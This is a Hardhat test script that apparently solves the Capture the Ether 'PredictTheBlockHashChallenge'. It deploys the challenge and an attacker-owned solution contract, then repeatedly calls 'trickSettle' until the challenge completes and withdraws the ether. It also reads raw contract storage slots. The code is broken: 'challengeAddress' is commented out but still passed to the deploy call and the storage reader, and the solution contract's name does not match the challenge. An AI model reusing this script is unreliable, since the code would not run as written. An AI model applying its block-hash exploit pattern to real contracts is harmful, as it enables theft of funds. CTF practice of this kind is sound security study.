import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer, utils } from "ethers";

// const challengeAddress = "0xC9cA1650c7d6cBD81F97928266aF0626C20FBEe8";
describe("PredictTheBlockHashChallenge", function () {
  let deployer: Signer;
  let attacker: Signer;

  const getWei = (eth: string) => {
    return ethers.utils.parseEther(eth);
  };
  const getEth = (wei: BigNumber) => {
    return wei.div("1000000000000000000");
  };

  beforeEach(async function () {
    [attacker, deployer] = await ethers.getSigners();
  });

  it("Should predict", async function () {
    // const challenge = await ethers.getContractAt("PredictTheBlockHashChallenge", challengeAddress);
    const Challenge = await ethers.getContractFactory("PredictTheBlockHashChallenge", deployer);
    const challenge = await Challenge.deploy({ value: utils.parseEther('1.0') });
    await challenge.deployed();

    const Solution = await ethers.getContractFactory("PredictTheFutureSolution", attacker);
    const solution = await Solution.deploy(challengeAddress, { value: getWei('1.0'), gasLimit: 6500000 });
    await solution.deployed();
    // const solution = await ethers.getContractAt("PredictTheFutureSolution", "0xA7e241317E742e8506e5f033d36085E13dbC3CAD");

    console.log('solution deployed at ', solution.address);

    for (let i = 0; i <= 1000; i++) {
      console.log(`[${i}] trickSettle...`);
      const receipt = await solution.trickSettle({ gasLimit: 6500000 });
      await receipt.wait();

      if (true === await challenge.isComplete()) {
        console.log(`done, withdrawing balance...`);
        await solution.withdraw({ gasLimit: 6500000 });
        break;
      }
    }
  });
})

const readChallengeStorage = async () => {
  const abiCoder = new ethers.utils.AbiCoder();
  const fieldNames = [
    // 'address',
    'uint8',
    'uint256'
  ];

  for (const i in fieldNames) {
    const field = fieldNames[i];
    const rawSlot = await ethers.provider.getStorageAt(challengeAddress, `0x${i}`);
    console.log('rawSlot', field, rawSlot, ethers.version);
    const value = abiCoder.decode([field], rawSlot);
    console.log(`val at ${i}/${field}: ${value}`);
  };
  return;

}
